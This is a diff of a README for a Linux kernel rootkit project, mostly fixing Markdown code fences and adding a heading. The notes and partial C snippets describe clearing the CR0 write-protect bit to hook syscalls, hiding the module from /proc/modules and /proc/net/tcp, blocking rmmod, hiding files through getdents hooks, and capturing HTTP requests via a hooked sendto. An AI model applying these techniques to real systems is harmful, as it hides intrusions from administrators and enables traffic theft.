@@ -9,6 +9,7 @@
     - [Hide module](#hide-module)
     - [Unable to rmmod](#unable-to-rmmod)
     - [Hiding Files and Processes](#hiding-files-and-processes)
+    - [Storing  the HTTP requests](#storing-the-http-requests)
     - [Inode modification trivia](#inode-modification-trivia)
 
 ## Features
@@ -30,7 +31,7 @@
                 - Search memory for the pointer table! (maybe another chokepoint!)
                 - https://bbs.archlinux.org/viewtopic.php?id=139406
         - Write to CR0 - Replace the write protect bit in CR0, hook functions
-            - ```c
+```c
 #if SYSCALL_MODIFY_METHOD == CR0
     original_cr0 = read_cr0();
     write_cr0(original_cr0 & ~0x00010000);```
@@ -61,12 +62,14 @@ int make_ro(unsigned long address)
     pte_t *pte = lookup_address(address, &level);
     pte->pte = pte->pte & ~_PAGE_RW;
     return 0;
-}```
+}
+```
 
 ### Hide module
         - `/proc/modules` - 
             - Read from the old one, replace rootkit and return. Done by hooking open syscall [fake file at `/etc/modules.rootkits`]
-            - ```c
+
+```c
 if (strcmp(filename, "/proc/modules") == 0)
 {
 	   
@@ -76,26 +79,29 @@ if (strcmp(filename, "/proc/modules") == 0)
   	// read the realmodule file
     // replace the rootkit after reading
     // write fake to the old file
-}```
+}
+```
         - `/proc/net/tcp` - 
             - Same as above with the temp file being - `/etc/net.rootkits`
             - Parse each line, check if inode belongs to the process if yes then remove
         - These make it hard for other commands written on top of `/proc/modules` hard to detect the module. 
 ### Unable to rmmod
         - It seems that allowing the userspace process not to open the rootkit blocks it from removing the module
-            - ```c
+```c
 #if UNABLE_TO_UNLOAD
     }
     else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0)
     {
     	ret = -ENOENT;
-#endif```
+#endif
+```
 
 ### Hiding Files and Processes
         - Using modifications to inodes
         - Hiding files - 
             - hooking `new_sys_getdents` and `new_sys_getdents64` - checks if the file with prefix is present in the dirent. if found the entry is deleted.
-    - **Storing  the HTTP requests**
+
+### Storing  the HTTP requests
         - syscall - `send_to` syscall hooked and the tcp data is checked for presence of headers.
 
 ### Inode modification trivia
